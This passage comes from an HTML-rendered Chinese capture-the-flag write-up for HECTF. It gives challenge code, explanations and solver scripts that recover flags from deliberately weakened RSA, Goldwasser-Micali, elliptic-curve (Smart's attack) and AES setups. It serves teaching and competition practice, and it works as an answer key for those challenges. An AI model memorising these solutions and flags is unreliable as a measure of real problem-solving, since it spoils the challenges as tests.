class="line">t = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q * t</span><br><span class="line">p_=<span class="built_in">pow</span>(p,<span class="number">2</span>,n)</span><br><span class="line">q_=<span class="built_in">pow</span>(q,<span class="number">2</span>,n)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p_=&#x27;</span>,p_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q_=&#x27;</span>,q_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n=&#x27;</span>,n)</span><br><span class="line"><span class="comment">#p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line"><span class="comment">#q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line"><span class="comment">#c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line"><span class="comment">#n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843 </span></span><br></pre></td></tr></table></figure></blockquote><p>因 $p^2&lt;n,q^2&lt;n$，可直接开放求得 $p,q$ 及 $r$。</p><p>又 $\gcd(e,\varphi)=6$，利用 $\gcd(\cfrac{e}{6},\varphi)=1$ 先常规RSA计算出 $m^6$ 再开方即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p_ = </span><br><span class="line">q_ = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(p_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q = gmpy2.iroot(q_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">r = n//(p*q)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">d = inverse_mod(e//<span class="number">6</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(mm,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Congratulation!!you_find_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint, e1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mygenerate</span>():</span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     p = getPrime(<span class="number">512</span>)</span><br><span class="line">     <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"> g = p-random.randint(<span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>)</span><br><span class="line"> q = sympy.nextprime(math.gamma(g+<span class="number">1</span>) % p)</span><br><span class="line"> <span class="keyword">return</span> p, g, q</span><br><span class="line"></span><br><span class="line">p, g, q = mygenerate()</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(hint)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, p)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g =&#x27;</span>+<span class="built_in">str</span>(g))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>+<span class="built_in">str</span>(c1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>+<span class="built_in">str</span>(c2))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line"><span class="string">g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line"><span class="string">c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line"><span class="string">c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>素因子的生成函数中，</p><p>$q=\text{nextprime}(\Gamma(g+1) \bmod p)=\text{nextprime}(g! \bmod p)=\text{nextprime}((p-r)! \bmod p)$</p><p>结合威尔逊定理 $(p-2)! \equiv 1 \pmod p$，有</p><p>$q = \text{nextprime}(\prod\limits_{k=2}^{r-1}(p-k)^{-1} \bmod p)$</p><p>求出 $p,q$ ，RSA解密得hint：$e_1=2$，再解密得 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">p =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">g =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line">c1 =<span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">c2 =<span class="number">11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line">r = p-g</span><br><span class="line">q = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,r):</span><br><span class="line">    q = q*inverse_mod(p-k,p)%p</span><br><span class="line">q = sympy.nextprime(q)</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2,f)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n)</span><br><span class="line">hint = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m2)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">2</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = x ^ e1 - c1</span><br><span class="line">x = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">flag= <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="onebit"><a href="#onebit" class="headerlink" title="onebit"></a>onebit</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Le</span>(<span class="params">n, p</span>):</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">pow</span>(n, (p - <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">message, n, g</span>):</span><br><span class="line"> ciphertext = []</span><br><span class="line"> <span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(message):</span><br><span class="line">     k = random.randint(<span class="number">1</span>, <span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line">     c = ((g**<span class="built_in">int</span>(m)) * (k ** <span class="number">2</span>)) % n</span><br><span class="line">     ciphertext.append(c)</span><br><span class="line"> <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> g = getPrime(<span class="number">512</span>)</span><br><span class="line"> <span class="keyword">if</span> Le(g, p) == p-<span class="number">1</span> <span class="keyword">and</span> Le(g, q) == q-<span class="number">1</span>:</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">m = <span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:]</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = Encrypt(m, n, g)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(p)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(g)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>加密结果 $c=g^mk^2$，符合GM同态加密系统，分别判断 $c_i$ 是否为基于模 $p$ 的二次剩余即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">10314655380768703978472206709958842273413011533146844672390572314617934317138270085463277616223314361910177207125628813385040318943783776184128231730068517</span></span><br><span class="line">g = <span class="number">8263101522955373984025637723346797526375555424855735493538626380254785750558737652925053637878963928060840011944043285344527052241847201267694354571887089</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cipher = <span class="built_in">int</span>(k)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.jacobi(cipher,p) == -<span class="number">1</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(plaintext,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;359dbb32-04d5d9c6-7d463ebc-741c7454&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">k=</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E.random_point()</span><br><span class="line">P.order()==p</span><br><span class="line">Q=k*P</span><br><span class="line">aes_key=k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P:&quot;</span>,P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Q:&quot;</span>,Q)</span><br><span class="line"><span class="comment">#P=E(180571547161769,227820272156445)</span></span><br><span class="line"><span class="comment">#Q=E(76765539897460,69715189045993)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plain_text = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">enc_text = aes.encrypt(pad(plain_text))</span><br><span class="line">enc_text_b64=base64.b64encode(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_text_b64)</span><br><span class="line"><span class="comment">#bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=</span></span><br></pre></td></tr></table></figure></blockquote><p>ECC+AES。</p><p>ECC满足 $P.\text{order}()=p$，利用Smart’s Attack解 $k$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">235322474717419</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">8856682</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E(<span class="number">180571547161769</span>,<span class="number">227820272156445</span>)</span><br><span class="line">Q = E(<span class="number">76765539897460</span>,<span class="number">69715189045993</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">k = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 152675955744921</span></span><br></pre></td></tr></table></figure><p>再代入还原AES解密即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;152675955744921&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc_text_b64 = <span class="string">&#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;</span></span><br><span class="line">enc_text = base64.b64decode(enc_text_b64)</span><br><span class="line">plain_text = aes.decrypt(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;N0w_you_know_ecc_and_AES!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="xyz"><a href="#xyz" class="headerlink" title="xyz"></a>xyz</h3><p>由于素数 $x \in (2^{11},2^{12})$，爆破 $x$ ，再解关于 $y,z$ 的二元一次模方程组，根据式2将 $z$ 代入式1，得到关于 $y$ 的模方程，爆破求解 $m_1,m_2$，直到得到满足flag格式的值即解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">90269941327372741986138990624471228922188543388582792147052657918058877926048530226733915401487146960603412188605706389044850057749941283247036686933647699313789471852317821572828450212687824860596198164570332523289084374240518841959770316611451490236432102245045517406282462838053843074444594398723921432791</span></span><br><span class="line">a = <span class="number">76528144673843458522824450076110371539627923753787397683655100259800630176098551106179842548579216667636910919853615859002981078385969868960955053568271518271225085057932965836858836455161323221071080085783042898199649213810735170960799816250402517689895712143360516054216300443029075429435539217594182165579</span></span><br><span class="line">b = <span class="number">29135602763193779141406655503080226411846533327113770010672935904333289317045484412179311504151348405577659318044617676010167479271362994129802985294731037903701693595616818788260673254684442485084195062784616665615921849434909060917998818395292558822723253741815121539892159313890553027457549798418207587319</span></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">if</span> i.bit_length()==<span class="number">12</span> <span class="keyword">and</span> gmpy2.is_prime(i):</span><br><span class="line">s.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ey = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    P.&lt;y&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    z = (b - x^<span class="number">12</span> - y^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)</span><br><span class="line">    g = (<span class="number">12</span> * x + <span class="number">12</span> * y + y * z + x * z ** <span class="number">12</span>) - a</span><br><span class="line">    roots = g.monic().roots()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(roots)&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> roots:</span><br><span class="line">            ee = x</span><br><span class="line">            yy = k[<span class="number">0</span>]</span><br><span class="line">            zz = (b - x^<span class="number">12</span> - yy^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)%p</span><br><span class="line">            d = inverse_mod(ee, p-<span class="number">1</span>)</span><br><span class="line">            m1 = <span class="built_in">pow</span>(yy, d, p)</span><br><span class="line">            m2 = <span class="built_in">pow</span>(zz, d, p)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;48454354467b&#x27;</span> <span class="keyword">in</span> <span class="built_in">hex</span>(m1)[<span class="number">2</span>:]:</span><br><span class="line">                <span class="built_in">print</span>(x)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]+<span class="built_in">hex</span>(m2)[<span class="number">2</span>:]))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="comment"># 3989</span></span><br><span class="line"><span class="comment"># HECTF&#123;46de31725b9a50b20e27cab2ddd5f5845cdd19066b4f97612&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="咦-小鲨鱼来喽"><a href="#咦-小鲨鱼来喽" class="headerlink" title="咦~小鲨鱼来喽"></a>咦~小鲨鱼来喽</h3><p>wireshark打开流量文件，逐个流查看，一眼找到flag。</p><p>​    </p><h3 id="来玩捉迷藏呀"><a href="#来玩捉迷藏呀" class="headerlink" 